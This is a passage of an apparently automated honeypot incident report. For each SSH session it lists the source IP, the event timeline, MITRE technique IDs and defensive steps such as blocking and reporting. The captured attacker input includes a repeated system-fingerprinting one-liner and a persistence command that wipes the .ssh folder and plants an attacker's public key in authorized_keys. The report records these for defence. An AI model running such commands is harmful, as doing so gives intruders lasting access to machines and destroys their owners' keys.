| **First Seen** | 2026-07-10 17:31 |
| **Last Seen** | 2026-07-10 17:31 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-10 17:31:03` | `cowrie.session.connect` |
| `2026-07-10 17:31:03` | `cowrie.client.version` |
| `2026-07-10 17:31:03` | `cowrie.client.kex` |
| `2026-07-10 17:31:04` | `cowrie.login.success` |
| `2026-07-10 17:31:04` | `cowrie.direct-tcpip.request` |
| `2026-07-10 17:31:04` | `cowrie.direct-tcpip.data` |
| `2026-07-10 17:31:04` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `64.89.161[.]90` to AbuseIPDB if not already reported
- [ ] Block `64.89.161[.]90` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-718255b6a512

| Field | Detail |
|---|---|
| **Source IP** | `78.189.17[.]35` |
| **First Seen** | 2026-07-10 17:32 |
| **Last Seen** | 2026-07-10 17:32 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-10 17:32:10` | `cowrie.session.connect` |
| `2026-07-10 17:32:10` | `cowrie.client.version` |
| `2026-07-10 17:32:10` | `cowrie.client.kex` |
| `2026-07-10 17:32:11` | `cowrie.login.success` |
| `2026-07-10 17:32:12` | `cowrie.direct-tcpip.request` |
| `2026-07-10 17:32:16` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `78.189.17[.]35` to AbuseIPDB if not already reported
- [ ] Block `78.189.17[.]35` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4dddac118e0b

| Field | Detail |
|---|---|
| **Source IP** | `58.245.210[.]70` |
| **First Seen** | 2026-07-10 17:32 |
| **Last Seen** | 2026-07-10 17:32 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-10 17:32:17` | `cowrie.session.connect` |
| `2026-07-10 17:32:18` | `cowrie.client.version` |
| `2026-07-10 17:32:18` | `cowrie.client.kex` |
| `2026-07-10 17:32:20` | `cowrie.login.success` |
| `2026-07-10 17:32:20` | `cowrie.direct-tcpip.request` |
| `2026-07-10 17:32:25` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `58.245.210[.]70` to AbuseIPDB if not already reported
- [ ] Block `58.245.210[.]70` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2dff8f61132d

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]232` |
| **First Seen** | 2026-07-10 17:32 |
| **Last Seen** | 2026-07-10 17:32 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-10 17:32:47` | `cowrie.session.connect` |
| `2026-07-10 17:32:47` | `cowrie.client.version` |
| `2026-07-10 17:32:47` | `cowrie.client.kex` |
| `2026-07-10 17:32:48` | `cowrie.login.success` |
| `2026-07-10 17:32:50` | `cowrie.session.params` |
| `2026-07-10 17:32:50` | `cowrie.command.input` |
| `2026-07-10 17:32:50` | `cowrie.command.input` |
| `2026-07-10 17:32:50` | `cowrie.command.input` |
| `2026-07-10 17:32:50` | `cowrie.command.input` |
| `2026-07-10 17:32:50` | `cowrie.command.input` |
| `2026-07-10 17:32:50` | `cowrie.command.success` |
| `2026-07-10 17:32:50` | `cowrie.command.input` |
| `2026-07-10 17:32:50` | `cowrie.command.input` |
| `2026-07-10 17:32:50` | `cowrie.command.input` |
| `2026-07-10 17:32:50` | `cowrie.command.input` |
| `2026-07-10 17:32:50` | `cowrie.log.closed` |
| `2026-07-10 17:32:50` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]232` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]232` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9e09b8c13c67

| Field | Detail |
|---|---|
| **Source IP** | `213.230.65[.]53` |
| **First Seen** | 2026-07-10 17:34 |
| **Last Seen** | 2026-07-10 17:34 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-10 17:34:07` | `cowrie.session.connect` |
| `2026-07-10 17:34:07` | `cowrie.client.version` |
| `2026-07-10 17:34:07` | `cowrie.client.kex` |
| `2026-07-10 17:34:09` | `cowrie.login.success` |
| `2026-07-10 17:34:09` | `cowrie.direct-tcpip.request` |
| `2026-07-10 17:34:14` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `213.230.65[.]53` to AbuseIPDB if not already reported
- [ ] Block `213.230.65[.]53` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-fa454fca7905

| Field | Detail |
|---|---|
| **Source IP** | `80.233.77[.]136` |
| **First Seen** | 2026-07-10 17:34 |
| **Last Seen** | 2026-07-10 17:34 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-10 17:34:19` | `cowrie.session.connect` |
| `2026-07-10 17:34:20` | `cowrie.client.version` |
| `2026-07-10 17:34:20` | `cowrie.client.kex` |
| `2026-07-10 17:34:21` | `cowrie.login.success` |
| `2026-07-10 17:34:21` | `cowrie.direct-tcpip.request` |
| `2026-07-10 17:34:25` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `80.233.77[.]136` to AbuseIPDB if not already reported
- [ ] Block `80.233.77[.]136` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a4f083d1b062

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]232` |
| **First Seen** | 2026-07-10 17:34 |
| **Last Seen** | 2026-07-10 17:34 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-10 17:34:48` | `cowrie.session.connect` |
| `2026-07-10 17:34:48` | `cowrie.client.version` |
| `2026-07-10 17:34:48` | `cowrie.client.kex` |
| `2026-07-10 17:34:49` | `cowrie.login.success` |
| `2026-07-10 17:34:50` | `cowrie.session.params` |
| `2026-07-10 17:34:50` | `cowrie.command.input` |
| `2026-07-10 17:34:50` | `cowrie.command.input` |
| `2026-07-10 17:34:50` | `cowrie.command.input` |
| `2026-07-10 17:34:50` | `cowrie.command.input` |
| `2026-07-10 17:34:50` | `cowrie.command.input` |
| `2026-07-10 17:34:50` | `cowrie.command.success` |
| `2026-07-10 17:34:50` | `cowrie.command.input` |
| `2026-07-10 17:34:50` | `cowrie.command.input` |
| `2026-07-10 17:34:50` | `cowrie.command.input` |
| `2026-07-10 17:34:50` | `cowrie.command.input` |
| `2026-07-10 17:34:50` | `cowrie.log.closed` |
| `2026-07-10 17:34:51` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]232` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]232` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b35798c5f047

| Field | Detail |
|---|---|
| **Source IP** | `144.22.238[.]238` |
| **First Seen** | 2026-07-10 17:35 |
| **Last Seen** | 2026-07-10 17:35 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-10 17:35:48` | `cowrie.session.connect` |
| `2026-07-10 17:35:48` | `cowrie.client.version` |
| `2026-07-10 17:35:48` | `cowrie.client.kex` |
| `2026-07-10 17:35:48` | `cowrie.login.success` |
| `2026-07-10 17:35:49` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `144.22.238[.]238` to AbuseIPDB if not already reported
- [ ] Block `144.22.238[.]238` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-938da1facb30

| Field | Detail |
|---|---|
| **Source IP** | `144.22.238[.]238` |
| **First Seen** | 2026-07-10 17:35 |
| **Last Seen** | 2026-07-10 17:35 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-10 17:35:49` | `cowrie.session.connect` |
| `2026-07-10 17:35:49` | `cowrie.client.version` |
| `2026-07-10 17:35:49` | `cowrie.client.kex` |
| `2026-07-10 17:35:49` | `cowrie.login.success` |
| `2026-07-10 17:35:50` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `144.22.238[.]238` to AbuseIPDB if not already reported
- [ ] Block `144.22.238[.]238` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0ff4617c04ae

| Field | Detail |
|---|---|
| **Source IP** | `144.22.238[.]238` |
| **First Seen** | 2026-07-10 17:35 |
| **Last Seen** | 2026-07-10 17:35 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-10 17:35:52` | `cowrie.session.connect` |
| `2026-07-10 17:35:52` | `cowrie.client.version` |
| `2026-07-10 17:35:52` | `cowrie.client.kex` |
| `2026-07-10 17:35:53` | `cowrie.login.success` |
| `2026-07-10 17:35:53` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `144.22.238[.]238` to AbuseIPDB if not already reported
- [ ] Block `144.22.238[.]238` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6b13c1154ad5

| Field | Detail |
|---|---|
| **Source IP** | `144.22.238[.]238` |
| **First Seen** | 2026-07-10 17:35 |
| **Last Seen** | 2026-07-10 17:35 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-10 17:35:53` | `cowrie.session.connect` |
| `2026-07-10 17:35:53` | `cowrie.client.version` |
| `2026-07-10 17:35:53` | `cowrie.client.kex` |
| `2026-07-10 17:35:54` | `cowrie.login.success` |
| `2026-07-10 17:35:54` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `144.22.238[.]238` to AbuseIPDB if not already reported
- [ ] Block `144.22.238[.]238` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0401cbc83861

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]232` |
| **First Seen** | 2026-07-10 17:37 |
| **Last Seen** | 2026-07-10 17:37 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-10 17:37:19` | `cowrie.session.connect` |
| `2026-07-10 17:37:19` | `cowrie.client.version` |
| `2026-07-10 17:37:19` | `cowrie.client.kex` |
| `2026-07-10 17:37:20` | `cowrie.login.success` |
| `2026-07-10 17:37:20` | `cowrie.session.params` |
| `2026-07-10 17:37:20` | `cowrie.command.input` |
| `2026-07-10 17:37:20` | `cowrie.command.input` |
| `2026-07-10 17:37:20` | `cowrie.command.input` |
| `2026-07-10 17:37:20` | `cowrie.command.input` |
| `2026-07-10 17:37:20` | `cowrie.command.input` |
| `2026-07-10 17:37:20` | `cowrie.command.success` |
| `2026-07-10 17:37:20` | `cowrie.command.input` |
| `2026-07-10 17:37:21` | `cowrie.command.input` |
| `2026-07-10 17:37:21` | `cowrie.command.input` |
| `2026-07-10 17:37:21` | `cowrie.command.input` |
| `2026-07-10 17:37:21` | `cowrie.log.closed` |
| `2026-07-10 17:37:21` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]232` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]232` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6f2b63a21835

| Field | Detail |
|---|---|
| **Source IP** | `185.242.3[.]195` |
| **First Seen** | 2026-07-10 17:39 |
| **Last Seen** | 2026-07-10 17:39 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-10 17:39:21` | `cowrie.session.connect` |
| `2026-07-10 17:39:21` | `cowrie.client.version` |
| `2026-07-10 17:39:21` | `cowrie.client.kex` |
| `2026-07-10 17:39:22` | `cowrie.login.success` |
| `2026-07-10 17:39:23` | `cowrie.session.params` |
| `2026-07-10 17:39:23` | `cowrie.command.input` |
| `2026-07-10 17:39:23` | `cowrie.log.closed` |
| `2026-07-10 17:39:23` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `185.242.3[.]195` to AbuseIPDB if not already reported
- [ ] Block `185.242.3[.]195` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-472202ea81f0

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]232` |
| **First Seen** | 2026-07-10 17:39 |
| **Last Seen** | 2026-07-10 17:39 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-10 17:39:48` | `cowrie.session.connect` |
| `2026-07-10 17:39:48` | `cowrie.client.version` |
| `2026-07-10 17:39:48` | `cowrie.client.kex` |
| `2026-07-10 17:39:50` | `cowrie.login.success` |
| `2026-07-10 17:39:51` | `cowrie.session.params` |
| `2026-07-10 17:39:51` | `cowrie.command.input` |
| `2026-07-10 17:39:51` | `cowrie.command.input` |
| `2026-07-10 17:39:51` | `cowrie.command.input` |
| `2026-07-10 17:39:51` | `cowrie.command.input` |
| `2026-07-10 17:39:51` | `cowrie.command.input` |
| `2026-07-10 17:39:51` | `cowrie.command.success` |
| `2026-07-10 17:39:51` | `cowrie.command.input` |
| `2026-07-10 17:39:51` | `cowrie.command.input` |
| `2026-07-10 17:39:51` | `cowrie.command.input` |
| `2026-07-10 17:39:51` | `cowrie.command.input` |
| `2026-07-10 17:39:51` | `cowrie.log.closed` |
| `2026-07-10 17:39:51` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]232` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]232` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5400c3465372

| Field | Detail |
|---|---|
| **Source IP** | `43.132.150[.]89` |
| **First Seen** | 2026-07-10 17:40 |
| **Last Seen** | 2026-07-10 17:40 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-10 17:40:32` | `cowrie.session.connect` |
| `2026-07-10 17:40:32` | `cowrie.client.version` |
| `2026-07-10 17:40:33` | `cowrie.client.kex` |
| `2026-07-10 17:40:34` | `cowrie.login.success` |
| `2026-07-10 17:40:35` | `cowrie.session.params` |
| `2026-07-10 17:40:35` | `cowrie.command.input` |
| `2026-07-10 17:40:35` | `cowrie.command.failed` |
| `2026-07-10 17:40:35` | `cowrie.log.closed` |
| `2026-07-10 17:40:36` | `cowrie.session.params` |
| `2026-07-10 17:40:36` | `cowrie.command.input` |
| `2026-07-10 17:40:36` | `cowrie.session.file_download` |
| `2026-07-10 17:40:36` | `cowrie.log.closed` |
| `2026-07-10 17:40:39` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `43.132.150[.]89` to AbuseIPDB if not already reported
- [ ] Block `43.132.150[.]89` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ce3d54d80f19

| Field | Detail |
|---|---|
| **Source IP** | `43.132.150[.]89` |
| **First Seen** | 2026-07-10 17:40 |
| **Last Seen** | 2026-07-10 17:40 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-10 17:40:36` | `cowrie.session.connect` |
| `2026-07-10 17:40:36` | `cowrie.client.version` |
| `2026-07-10 17:40:37` | `cowrie.client.kex` |
| `2026-07-10 17:40:38` | `cowrie.login.success` |
| `2026-07-10 17:40:38` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `43.132.150[.]89` to AbuseIPDB if not already reported
- [ ] Block `43.132.150[.]89` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ad09a12df0a9

| Field | Detail |
|---|---|
| **Source IP** | `43.132.150[.]89` |
| **First Seen** | 2026-07-10 17:40 |
| **Last Seen** | 2026-07-10 17:40 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-10 17:40:38` | `cowrie.session.connect` |
| `2026-07-10 17:40:38` | `cowrie.client.version` |
| `2026-07-10 17:40:38` | `cowrie.client.kex` |
| `2026-07-10 17:40:39` | `cowrie.login.success` |
| `2026-07-10 17:40:39` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `43.132.150[.]89` to AbuseIPDB if not already reported
- [ ] Block `43.132.150[.]89` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2f19fa48f6c6

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]232` |
| **First Seen** | 2026-07-10 17:41 |
| **Last Seen** | 2026-07-10 17:41 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-10 17:41:49` | `cowrie.session.connect` |
| `2026-07-10 17:41:49` | `cowrie.client.version` |
| `2026-07-10 17:41:49` | `cowrie.client.kex` |
| `2026-07-10 17:41:51` | `cowrie.login.success` |
| `2026-07-10 17:41:53` | `cowrie.session.params` |
| `2026-07-10 17:41:53` | `cowrie.command.input` |
| `2026-07-10 17:41:53` | `cowrie.command.input` |
| `2026-07-10 17:41:53` | `cowrie.command.input` |
| `2026-07-10 17:41:53` | `cowrie.command.input` |
| `2026-07-10 17:41:53` | `cowrie.command.input` |
| `2026-07-10 17:41:53` | `cowrie.command.success` |
| `2026-07-10 17:41:53` | `cowrie.command.input` |
| `2026-07-10 17:41:53` | `cowrie.command.input` |
| `2026-07-10 17:41:53` | `cowrie.command.input` |
| `2026-07-10 17:41:53` | `cowrie.command.input` |
| `2026-07-10 17:41:53` | `cowrie.log.closed` |
| `2026-07-10 17:41:54` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]232` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]232` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5a293c9d25be

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]232` |
| **First Seen** | 2026-07-10 17:43 |
| **Last Seen** | 2026-07-10 17:43 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-10 17:43:44` | `cowrie.session.connect` |
| `2026-07-10 17:43:45` | `cowrie.client.version` |
| `2026-07-10 17:43:45` | `cowrie.client.kex` |
| `2026-07-10 17:43:47` | `cowrie.login.success` |
| `2026-07-10 17:43:48` | `cowrie.session.params` |
| `2026-07-10 17:43:48` | `cowrie.command.input` |
| `2026-07-10 17:43:48` | `cowrie.command.input` |
| `2026-07-10 17:43:48` | `cowrie.command.input` |
| `2026-07-10 17:43:48` | `cowrie.command.input` |
| `2026-07-10 17:43:48` | `cowrie.command.input` |
| `2026-07-10 17:43:48` | `cowrie.command.success` |
| `2026-07-10 17:43:48` | `cowrie.command.input` |
| `2026-07-10 17:43:48` | `cowrie.command.input` |
| `2026-07-10 17:43:48` | `cowrie.command.input` |
| `2026-07-10 17:43:48` | `cowrie.command.input` |
| `2026-07-10 17:43:49` | `cowrie.log.closed` |
| `2026-07-10 17:43:50` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]232` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]232` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-877904208a44

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]232` |
